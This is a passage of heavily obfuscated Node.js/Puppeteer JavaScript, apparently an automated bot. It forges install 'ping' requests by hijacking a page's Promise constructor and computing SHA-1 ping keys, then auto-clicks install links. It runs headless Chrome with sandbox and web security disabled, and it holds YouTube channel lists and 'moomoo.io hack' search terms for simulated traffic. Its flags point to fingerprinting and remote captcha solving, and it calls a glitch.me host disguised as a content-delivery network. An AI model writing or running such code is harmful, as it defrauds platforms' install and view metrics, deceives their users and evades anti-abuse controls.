0x7b4) << y[0x6 * 0x26a + -0x210e + 0x47 * 0x43 & N++], P[N >> 0x157b + -0x7 * -0x24a + 0x1 * -0x257f] |= (-0x22b * -0xc + 0x77 * -0x43 + -0x83 * -0xb | L >> 0x21a * 0x6 + -0x18dd + 0xc4d & 0x21dc + 0xb * 0x11b + -0x2dc6) << y[-0x5cf * 0x3 + -0xfe * -0x16 + 0x1 * -0x464 & N++], P[N >> -0x296 * -0x2 + -0x5 * 0x154 + -0x12 * -0x15] |= (-0x1798 + -0x962 * 0x1 + -0xa * -0x359 | L >> -0x1bf * 0xe + 0x2 * 0xff6 + 0x3 * -0x27c & 0x13 * 0x6d + -0xe97 + 0x6bf) << y[-0xb4e * -0x2 + 0x1a55 * -0x1 + -0x4 * -0xef & N++], P[N >> -0xd71 + -0x20a5 + -0x127 * -0x28] |= (0x2 * 0x4b + -0x1a71 + -0xad * -0x27 | -0x79d * -0x2 + 0x40 * 0x2e + 0x1 * -0x1a7b & L) << y[-0x359 * -0xb + 0x2 * 0x9b + -0x2606 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x12d6 + 0x4d2 * 0x3 + -0x210c ? (this['block'] = P[-0x70 * 0x3a + 0x2c * 0x64 + -0xb0 * -0xc], this['start'] = N - (0x1019 + -0x1d5f + 0xd86), this['hash'](), this['hashed'] = -0xf2d + -0xacf + 0x19fd) : this['start'] = N;
                }
                return this['bytes'] > 0x3e1fac * 0xc9 + -0xbe845cff + 0x4e * 0x519675f && (this['hBytes'] += this['bytes'] / (-0x10626f95c + -0x1693fed74 + -0xdbd9b9b4 * -0x4) << -0x6f6 * 0x1 + 0x1fcf + 0x1 * -0x18d9, this['bytes'] = this['bytes'] % (-0x192e * -0xcd5b2 + 0x161781080 + -0x1e4857 * 0xde4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x13d * 0x1b + 0x1 * 0x22bf + -0x233 * 0x1f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1 * -0x119f + -0x569 * 0x5 + 0xf * 0xa2] = this['block'], J[K >> 0x1 * -0x18d1 + -0x1 * -0x1de4 + -0x511] |= x[-0x53 * -0x7 + 0x10b7 + -0x12f9 & K], this['block'] = J[0x10 * 0x214 + -0x103 + -0x202d], K >= -0x1e78 + 0x1 * 0x1bd7 + 0x2d9 && (this['hashed'] || this['hash'](), J[0x1669 + 0x3 * 0x1db + -0x1bfa] = this['block'], J[-0xcd * 0x8 + -0x1072 + 0x16ea] = J[-0x2406 + 0xb * -0x32d + 0x3e * 0x125] = J[-0x175a + -0x1 * -0x230b + -0xbaf] = J[0xf + -0x309 + 0x2fd] = J[0x6 * 0x5d6 + -0x1ce8 + -0x618] = J[-0xa00 + -0x2 * -0x949 + -0x88d] = J[0x1 * -0x80e + 0x1ab6 + -0x1dd * 0xa] = J[0x2660 + 0x29 * 0xe6 + -0x4b2f] = J[-0x287 * -0xa + -0x22da + 0x99c] = J[-0x9c9 + -0xca2 * 0x3 + 0x2fb8] = J[-0x1 * -0x541 + -0xa4 * -0x25 + 0x2a1 * -0xb] = J[0x12f1 + 0x2095 + -0x1129 * 0x3] = J[0x11c2 + -0x26f5 + 0x153f] = J[0x60a * -0x4 + 0xd2b + -0x2 * -0x585] = J[-0x1ee6 * -0x1 + 0x259b + -0x4473] = J[-0x397 + -0xcfb + 0x10a1] = 0x1b13 + -0x335 + -0x17de * 0x1), J[0x1 * 0x266 + 0x3a1 * -0x9 + 0x1e51] = this['hBytes'] << -0x1 * 0x56d + 0x4 * -0x22d + 0xe24 | this['bytes'] >>> 0x2278 + 0x5e * 0x62 + -0x4657, J[0x17fd + 0x263 * -0x3 + -0x10c5] = this['bytes'] << -0x609 + -0x11e + 0x72a, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x915 + 0x1596 + -0xc71; J < -0x2f9 * 0x8 + 0xe8d + 0x98b; ++J)
                K = Q[J - (0x1596 + -0x7d7 + -0xdbc)] ^ Q[J - (-0xd8b + -0x1647 + 0x23da)] ^ Q[J - (-0x9bf + 0x2 * -0x3fe + -0x1d * -0x9d)] ^ Q[J - (-0x1 * 0x240c + 0x138e + 0x146 * 0xd)], Q[J] = K << 0x4 * 0x613 + 0x1 * 0x251 + -0x1a9c | K >>> -0x1 * 0x51 + -0x34 * -0x27 + -0x77c;
              for (J = -0xc27 + 0xbc + 0xb6b; J < -0x1241 + -0xe64 + -0x1 * -0x20b9; J += -0x1a26 + 0x2 * -0xa09 + 0x2e3d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x14b * 0x1d + 0xb * -0x32f + 0x4889 | L >>> 0x32c + 0x1 * -0x150c + 0x11fb * 0x1) + (M & N | ~M & O) + P + (0xdd597 * -0x141 + 0x1 * 0x6edba161 + 0x15745 * -0x23d) + Q[J] << 0x7ca + -0x1 * -0xecf + -0x1699) << -0x179a + 0x1 * -0x25ab + 0x3d4a | P >>> 0xaa6 + -0x1004 + 0x579 * 0x1) + (L & (M = M << -0x948 + 0xa29 + -0xd * 0xf | M >>> -0xa * -0x2b + 0x1 * 0x4a3 + -0x64f) | ~L & N) + O + (0x900fc88d + -0x823ac2b9 + -0x3297 * -0x18403) + Q[J + (-0x25c8 + 0x70b * 0x3 + -0x52 * -0x34)] << -0xc22 + -0xce3 + 0x1905) << -0x7d1 + -0xe * 0x254 + 0x286e | O >>> 0x12f8 + 0x78 * -0x16 + 0x88d * -0x1) + (P & (L = L << -0x1a * -0xf1 + -0x437 * 0x3 + -0xbb7 * 0x1 | L >>> 0x19aa + 0x1a42 + -0x5 * 0xa62) | ~P & M) + N + (0x68bb46e8 + -0x5a168f0d + 0xecd9c7 * 0x52) + Q[J + (0xe7d + -0x1aed * 0x1 + -0x162 * -0x9)] << 0x1785 + -0x199 + -0x15ec) << 0x11bd + 0x3 * 0x79d + 0x3 * -0xd85 | N >>> -0xcf * -0x7 + -0xa98 + 0x81 * 0xa) + (O & (P = P << 0x8a6 * -0x3 + 0x3e * 0x95 + -0x1 * 0xa06 | P >>> -0xeb * -0x19 + -0x232f * 0x1 + 0x2 * 0x61f) | ~O & L) + M + (0x873a5118 + -0x9cb40bb + 0x5b3b02 * -0x62) + Q[J + (0x1 * 0x1571 + 0xde6 + -0x143 * 0x1c)] << -0x1912 + -0x35b * -0x6 + 0x4f0) << -0x198c + -0x15d * 0x17 + -0x4 * -0xe3b | M >>> 0x47d + -0x2087 + 0x1c25) + (N & (O = O << -0xad1 + -0x921 + 0x1410 | O >>> -0xd9b + 0xdab + -0x7 * 0x2) | ~N & P) + L + (-0x2 * -0x161adcb5 + 0x65 * 0xcaee47 + -0x21c341d4) + Q[J + (-0x16 + 0x18ca + -0x18b0)] << -0x2447 + -0x280 + 0x26c7, N = N << -0xb * 0x184 + 0x6a * 0x1 + 0x1060 | N >>> -0x4a * -0x11 + -0xb5 + -0x433 * 0x1;
              for (; J < 0xcc4 * 0x3 + -0x7f * -0x2c + -0x3bf8; J += 0x2239 + -0x35 * 0x7f + -0x2d * 0x2d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x5 * 0x617 + -0x1 * 0x1bcd + -0x2a1 | L >>> -0x1 * -0x1f96 + 0xd10 * 0x2 + -0x399b * 0x1) + (M ^ N ^ O) + P + (0x157 * 0x62ef7f + -0x1 * 0xcd092d3 + 0x295 * -0x371a1) + Q[J] << 0x1df + -0xce * 0xf + 0x7 * 0x175) << -0x2235 + -0x7e7 + 0x2a21 | P >>> 0x8ad * 0x1 + -0x1 * -0x18a8 + -0x109d * 0x2) + (L ^ (M = M << 0x1e65 * -0x1 + 0x1339 + 0xa * 0x121 | M >>> -0x18c5 * 0x1 + 0x168 * -0x11 + 0x30af) ^ N) + O + (-0xd6d8c272 + -0x1e5b3e3c * 0x7 + -0x3 * -0xb365cb3d) + Q[J + (0x3 * 0x95 + 0x15 * 0x188 + 0x10f3 * -0x2)] << 0x1a71 * -0x1 + 0xf17 + 0xb5a) << 0x196f * -0x1 + -0x72e + -0x2 * -0x1051 | O >>> 0x2 * 0xfa1 + 0x1 * -0xdd3 + -0x1154) + (P ^ (L = L << -0x1161 * -0x2 + 0x2bd * 0x9 + -0x3b49 | L >>> 0xaca + -0x83 * -0x6 + 0xc5 * -0x12) ^ M) + N + (-0xd1875d3a + -0x170a3d5a + 0x1576b8635) + Q[J + (-0x218 + 0xd9 * -0xb + 0xb6d)] << -0x1ca5 + -0x1ee * 0x2 + -0x35 * -0x9d) << 0x323 * 0x1 + 0x282 * 0x5 + 0x18 * -0xa7 | N >>> 0xf9a + 0xa0a + -0x1989 * 0x1) + (O ^ (P = P << -0x10f7 + -0x12e9 + -0x11 * -0x21e | P >>> 0x17 * 0x52 + -0x5 * 0x1b + -0x247 * 0x3) ^ L) + M + (-0xb0e1e060 + 0x37643926 * 0x3 + 0x2395 * 0x36a93) + Q[J + (0x1853 + -0x1d3b * -0x1 + -0x5f3 * 0x9)] << 0x12f2 + 0x1ce0 + -0x2fd2) << -0xcc5 * -0x3 + -0x1f5e + -0x376 * 0x2 | M >>> 0x3 * -0x49 + -0x25cf * -0x1 + -0x24d9) + (N ^ (O = O << -0x26f4 + 0x4 * -0x4f1 + 0x3ad6 | O >>> -0x1dbe + -0x1be * -0xc + 0x8d8) ^ P) + L + (0x26 * 0x3433e23 + -0x3f908ac3 * -0x1 + 0x4 * -0x132c7615) + Q[J + (0x11ed + -0x1e * -0x91 + -0x22e7)] << -0x319 + -0xb * -0xc5 + -0x6 * 0xe5, N = N << 0x1 * -0x1a3f + 0x1d0f + 0xe6 * -0x3 | N >>> -0x10b * -0x4 + -0x11dc + 0xdb2;
              for (; J < 0x2246 * 0x1 + -0x33 * -0x2f + -0x2b67; J += -0x12 * 0x19e + -0x1 * -0x15c5 + 0x75c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1cae + -0x161a + -0x68f | L >>> 0x12b * -0xe + 0x2cb + 0x13e * 0xb) + (M & N | M & O | N & O) + P - (-0x3 * 0x43f9a386 + -0x133 * 0x915a3d + 0x1eb2064dd) + Q[J] << 0x1ac9 * 0x1 + -0x15c1 + -0x508) << -0x18d + -0x10bf * 0x1 + -0x61b * -0x3 | P >>> -0x241c + 0x9c3 + 0x1 * 0x1a74) + (L & (M = M << -0x8 * 0x194 + 0x420 * 0x3 + -0x1 * -0x5e | M >>> -0x34d + 0xdd * -0x23 + 0x2186) | L & N | M & N) + O - (0x35e * -0x36e668 + -0x58d0 * 0xb041 + -0xd7 * -0x1ab567c) + Q[J + (0x167e + 0x40 + -0x16bd)] << 0x1a34 + -0x75a + -0x12da) << -0x3 * -0x7ee + 0xec * -0xf + -0x9f1 | O >>> -0xc6 * 0x17 + -0xb * 0x1fa + 0x27a3) + (P & (L = L << 0x6 * -0x48f + 0x23eb + -0x873 | L >>> -0x20 * 0xa + -0x1128 + -0x935 * -0x2) | P & M | L & M) + N - (0xaaa5c79a * 0x1 + 0x1 * -0x93b1ad6f + 0x59f028f9) + Q[J + (0x1335 + -0x19d6 + 0x6a3)] << -0x1c5f + -0x2152 + 0x3db1) << 0x136d * 0x1 + 0x1 * -0xcb5 + -0x6b3 | N >>> -0xb * -0xc5 + 0x26c3 + -0x2f1f) + (O & (P = P << -0xb91 * -0x3 + -0xcf6 + -0x159f | P >>> -0x6 * -0x135 + 0x1a35 * 0x1 + 0x1 * -0x2171) | O & L | P & L) + M - (0x76840fb9 + 0x5 * -0xcbf6db5 + 0x3a1d57f4) + Q[J + (-0x97b + 0x1be2 + -0x1264)] << -0x42b + 0x5 * -0x665 + 0x2424) << -0x1 * 0x10a5 + -0x26e5 + 0x378f | M >>> 0xcd * -0x3 + 0x2 * -0x92b + 0x14d8) + (N & (O = O << 0x2686 + 0x247d + -0x4ae5 | O >>> 0x17 * -0x43 + -0x219e + 0x27a5) | N & P | O & P) + L - (0xa662a3be + -0xd8e3fd01 + 0x2db5 * 0x3932b) + Q[J + (0x841 + -0x2114 + 0x18d7 * 0x1)] << -0x9b9 * -0x2 + -0x1704 + 0x392 * 0x1, N = N << -0x1 * -0x784 + 0xb27 + -0x3 * 0x62f | N >>> -0x2243 + -0x1dcf + 0x4014;
              for (; J < -0x19e8 + 0x1 * 0x1754 + -0x25 * -0x14; J += -0x2 * -0x10bb + 0x1c3f + -0x1ed8 * 0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1945 + 0x9ce + -0x230e | L >>> -0x2470 + 0x16db + 0xdb0) + (M ^ N ^ O) + P - (-0x54adca3 + -0x516b1a1f + 0xbc * 0xbf14b5) + Q[J] << 0xdf * -0x27 + 0x1 * -0x8dd + 0x2 * 0x156b) << 0xd35 + -0x1 * -0x134a + -0x207a | P >>> 0xf * 0x29a + -0x1d71 + -0x97a) + (L ^ (M = M << -0x4d2 + -0x1c02 + 0x20f2 | M >>> 0x371 * -0xa + 0x1457 + 0xe15) ^ N) + O - (-0x41b968f7 + -0x23fa88a2 + 0x9b512fc3) + Q[J + (0x30 * 0x38 + -0x1a93 + 0x80a * 0x2)] << 0x2132 + -0x1c03 + -0x1 * 0x52f) << -0x4f * 0x2 + -0x272 * -0x1 + 0x1cf * -0x1 | O >>> 0x1c * 0x10f + 0x0 + 0x1 * -0x1d89) + (P ^ (L = L << -0x1cb5 * -0x1 + 0xc32 + -0x35 * 0xc5 | L >>> -0x173 + 0x11a4 + -0x3 * 0x565) ^ M) + N - (0x5f0a5f2e + -0x5c8c7a20 + 0x331f591c) + Q[J + (0x169 + -0x15b2 + 0x144b)] << 0x677 * -0x5 + -0x1e0e + 0x3e61 * 0x1) << 0x14b * 0xb + 0xc21 + -0x1a55 | N >>> -0x2473 * 0x1 + -0x1f * 0x32 + 0xca * 0x36) + (O ^ (P = P << 0x2e7 * -0x5 + -0x1dae + 0x2c4f | P >>> -0x1cd5 * 0x1 + -0x21 * 0xae + 0x3345) ^ L) + M - (0x3960ef40 + -0x4c2abcc7 + 0x48670bb1) + Q[J + (-0x2 * -0xaa4 + 0x16aa + 0x2bef * -0x1)] << 0x12bb + -0x116b + -0x150) << -0x3 * -0xce + -0x1dd1 * 0x1 + -0xa * -0x2be | M >>> -0x1e96 + -0x2426 + -0x1 * -0x42d7) + (N ^ (O = O << 0xb5 * 0x11 + 0x26e9 + 0x4 * -0xcb4 | O >>> -0x2ce + -0x1fea + -0xa * -0x379) ^ P) + L - (0x55ac6819 + -0x13 * 0x4b39e46 + 0x39459543) + Q[J + (-0x1 * -0x18a9 + -0x7cc + -0x10d9)] << 0x23a5 + 0x1178 + -0x351d, N = N << 0x5 * 0x581 + 0x1346 + 0x15 * -0x239 | N >>> 0x39 * 0xa + 0x1d8a + -0x1fc2;
              this['h0'] = this['h0'] + L << -0xf * 0x13c + -0x25 * 0xa9 + 0x2af1, this['h1'] = this['h1'] + M << -0x3 * 0x9a9 + 0x20a5 + -0x3aa, this['h2'] = this['h2'] + N << 0x152f + -0x1 * 0xdc2 + -0x76d, this['h3'] = this['h3'] + O << 0x1d * 0x53 + -0x66c + -0x2fb, this['h4'] = this['h4'] + P << 0x33d * -0xb + -0x195 * 0x6 + 0x2d1d * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xa49 * 0x1 + 0x61 * 0x3 + 0x6 * 0x18b & 0x57d * -0x2 + 0x15f1 + -0x15d * 0x8] + w[J >> 0x317 * -0x1 + 0xe7d * -0x2 + 0x2029 & -0x472 * 0x1 + -0x66a * 0x1 + 0xaeb] + w[J >> -0x18a5 + -0x10 * -0x95 + 0x107 * 0xf & -0x1 * 0x32f + 0x1d78 + -0xd1d * 0x2] + w[J >> -0x6a4 + 0x2 * 0x475 + 0x2 * -0x11b & 0x1daa + -0x33 * 0x1b + -0x1bb * 0xe] + w[J >> 0x12b + 0x699 + 0x34 * -0x26 & -0x1b57 * 0x1 + 0x8 * -0x3 + 0x1b7e] + w[J >> 0xe7f + -0x26a8 + 0xb * 0x233 & 0x195b + 0x784 + -0x20d0] + w[J >> 0x1949 * -0x1 + 0x1eb5 + 0x2b4 * -0x2 & 0x2 * -0xcbd + 0x1f3 * 0x14 + -0xd73] + w[0xdd8 + 0x75c + -0x1525 & J] + w[K >> 0x2 * 0x11bd + -0xec5 + -0x1499 & 0x1 * -0x23b + -0x3 * 0x8bf + 0x1c87] + w[K >> -0x395 + -0x3cd + 0x77a & -0xb47 + -0x1797 + 0x22ed] + w[K >> 0xbb2 + -0x5 * -0x36d + -0x29d * 0xb & -0x1 * 0x153 + -0x52c + 0x68e] + w[K >> -0x1780 + 0x1949 + 0x3f * -0x7 & 0x819 + -0x20ec + 0x18e2] + w[K >> -0xd63 + -0x1 * -0x18b5 + -0xb46 & 0x12d0 + 0x1bab + -0x2e6c * 0x1] + w[K >> -0x277 * 0x2 + -0x7 * 0x19f + -0x343 * -0x5 & -0x1 * 0x2396 + -0x1fb6 + -0x1 * -0x435b] + w[K >> -0x9f6 + -0x3f2 + 0xdec & 0xd37 + -0x702 + 0x1 * -0x626] + w[0x269 + -0x10d3 + 0x11d * 0xd & K] + w[L >> 0x19fb + 0x1b * 0x72 + -0x25e5 & -0x16d * 0x2 + -0xa60 * 0x1 + -0xb3 * -0x13] + w[L >> -0x132 * -0x4 + 0x13bf + -0x186f & 0x133b + -0x1 * -0xcdf + -0x200b] + w[L >> -0x1dc8 + 0x1691 + 0x1 * 0x74b & -0x44d * 0x2 + 0x1758 + -0xeaf] + w[L >> 0x139 * 0x3 + 0x224d + 0x1 * -0x25e8 & 0x58c + 0x1064 + 0x15e1 * -0x1] + w[L >> 0x40f * 0x7 + -0x22 * 0x35 + 0x67 * -0x35 & -0x9 * -0x3ee + 0xb2 * -0x9 + -0x1d0d] + w[L >> 0x2 * 0x43f + 0xcc4 + -0x13 * 0x11e & -0x20 * -0x8a + 0x2171 + 0x1951 * -0x2] + w[L >> 0x1 * -0x101f + -0x1e97 + 0x2eba & 0x1 * 0x10d2 + 0x1687 * 0x1 + -0x274a] + w[-0x277 * 0x8 + 0x23d5 + -0x100e & L] + w[M >> 0x6bb * -0x1 + -0x6 * 0xf8 + -0x4f * -0x29 & 0x1 * -0x7e1 + -0xb8d * -0x1 + -0x39d] + w[M >> 0xa * -0x1af + -0x1 * -0x1e7 + -0x1 * -0xf07 & 0x22fa + -0x1 * -0x258a + -0x4875] + w[M >> -0x1b05 + -0xcab + 0x27c4 & 0x1 * -0x991 + -0x13b6 * 0x1 + 0x2ef * 0xa] + w[M >> 0x1454 + -0x387 + -0x10bd & 0x1b * 0xfc + 0x5 * -0xe3 + -0xb0b * 0x2] + w[M >> -0x1 * -0x9bb + -0x20a2 + 0x16f3 & -0x89 * -0x7 + -0x1 * -0xa7 + -0x457] + w[M >> 0xe93 + 0x577 * 0x6 + -0x6c3 * 0x7 & 0x2 * -0x3d1 + 0x6d3 + 0xde] + w[M >> 0xdd3 + 0x1a0a + -0x27d9 & 0x683 + 0x1e8b * -0x1 + -0x1 * -0x1817] + w[0x63 * -0x7 + 0xd8e + -0xaca & M] + w[N >> 0x249e + 0x24c5 * 0x1 + -0x4947 & 0x5 * -0x2ef + 0x13c2 + -0x508] + w[N >> 0x8 * -0x12c + -0x59 * -0x5b + 0x162b * -0x1 & -0x2b * 0xbf + -0x9f9 + 0x2a1d] + w[N >> -0xe8 + 0x69d + -0x5a1 & -0x1309 + 0x2548 + 0xc2 * -0x18] + w[N >> -0x250d + -0x1 * 0x15e6 + -0x3b03 * -0x1 & -0x12b1 + 0xaf * -0x23 + -0x13 * -0x23f] + w[N >> -0x8 * -0x39d + 0x1cc1 + -0x399d & -0x13c7 + 0x1 * -0x1a7 + -0x157d * -0x1] + w[N >> 0x12d * 0x3 + 0x1407 + -0x1 * 0x1786 & -0x652 * -0x5 + -0x1 * -0xfd + -0x2b6 * 0xc] + w[N >> 0x1 * 0x9b0 + 0x22bd + -0x1 * 0x2c69 & -0xed5 * -0x2 + -0x12f0 + -0xaab] + w[0x53a + -0x124f + 0xd24 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x3 * -0x5f3 + 0x1ace + 0xb * -0x40d & -0x1a7 * 0xe + -0x18 * 0xa9 + 0x27f9,
                J >> 0x2 * 0x12b9 + -0x2 * -0x116d + -0x483c & 0x1 * 0x13e8 + -0x2691 + 0x13a8,
                J >> 0x56 * -0x11 + -0x1224 + 0x7f6 * 0x3 & -0xe37 + 0x16b5 + 0x77f * -0x1,
                -0x86 * -0x3b + 0x751 * -0x2 + -0xb * 0x163 & J,
                K >> -0x5 * -0x523 + 0x2142 + 0x1 * -0x3ad9 & -0x2 * 0x6fe + -0xf01 * -0x1 + -0x6,
                K >> -0xcf9 + -0x195a + -0x1 * -0x2663 & -0x103f + 0x1537 + 0x153 * -0x3,
                K >> 0x126 * 0x7 + -0xd12 + 0x510 & -0x482 + -0x2d * -0xa7 + -0x17da,
                0x23e * -0x6 + 0xf0e * 0x1 + 0x9b * -0x1 & K,
                L >> -0xc * 0x2f + 0xd * 0x16f + 0x1057 * -0x1 & -0x1bf8 + 0x168e + 0x1 * 0x669,
                L >> 0x948 + 0x2025 + -0x295d * 0x1 & -0x1e41 + 0x7bd + 0x1783 * 0x1,
                L >> -0x1ba0 + -0x1ffd + 0x3ba5 & -0x155e + -0xea + 0x1747 * 0x1,
                0x5cf * -0x5 + 0xa57 * 0x2 + 0x95c & L,
                M >> -0x1a6b + 0x2223 * 0x1 + -0x20 * 0x3d & -0x1a46 + -0x1aac + 0x35f1 * 0x1,
                M >> 0x4 * -0x97f + -0x3fb * -0x3 + 0x1a1b * 0x1 & -0x15d3 + 0x487 + 0x124b,
                M >> -0x40 * 0x14 + 0x21a3 + 0x1c9b * -0x1 & -0x1574 + 0x107 + -0x2 * -0xab6,
                -0x2 * -0x579 + -0x21c1 + -0xb * -0x22a & M,
                N >> -0x1990 + -0xed1 + 0x2879 & -0xf25 * 0x1 + -0x2275 * -0x1 + -0x209 * 0x9,
                N >> -0x67a + 0x95 * -0xd + 0xe1b * 0x1 & -0x144 + -0x4 * 0x502 + -0xd * -0x1b7,
                N >> -0x1a29 * -0x1 + -0x1 * 0xf34 + -0xaed * 0x1 & 0x1662 + 0x36 * -0x5 + -0xf * 0x15b,
                0xcb * -0x11 + -0x6a5 + 0x151f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x2c4 * 0x4 + 0x62 * 0x5b + 0x2 * -0xbd9), (K = new DataView(J))['setUint32'](0x1c63 * 0x1 + 0xebf + -0x2b22, this['h0']), K['setUint32'](-0x3b2 + 0x1 * 0x1c5 + -0x47 * -0x7, this['h1']), K['setUint32'](0x10e1 + 0xf76 + -0x1 * 0x204f, this['h2']), K['setUint32'](-0x7 * 0x2f7 + 0xd0b + 0x7c2, this['h3']), K['setUint32'](-0x3c0 * 0x9 + -0x1063 + 0x3233, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1065 * -0x2 + -0x77 * -0x49 + 0x42b9 * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x768 + -0x16a + -0x2 * -0x469;
            J[0xcd6 * -0x2 + -0x1f77 + 0x3923]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xd71 + -0x2a * 0x53 + 0x2d] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1153 * 0x2 + -0x1171 + -0x16f * 0xc), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2 * -0x1ba + 0x161 * 0x17 + -0x7 * 0x506;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x268a + -0x347 * -0x7 + -0x379f * 0x1), Promise['resolve'](-0x1fd7 + -0x1 * 0x1b53 + -0x63 * -0x99);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * -0x180b + 0x3a3 + -0xa34 * -0x2; j < -0x2529 + 0x1dec + 0x73e * 0x1; j++)
    i();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x166 * -0x1 + -0x41f * -0x5 + -0x1601);
    let h = e[f];
    return h;
  }, d(b, c);
}
const NETWORK_PATIENCE = -0x5a * 0x1a + 0x1 * 0x1395 + 0x1 * 0x14cf + (-0xc87 + -0x36f * 0x3 + 0x21 * 0x10c) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * -0x25e7 + 0xb82 + -0x3166) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      Y(0x7) + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x328 + 0x17 * -0x18b + -0x10b * -0x1f; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 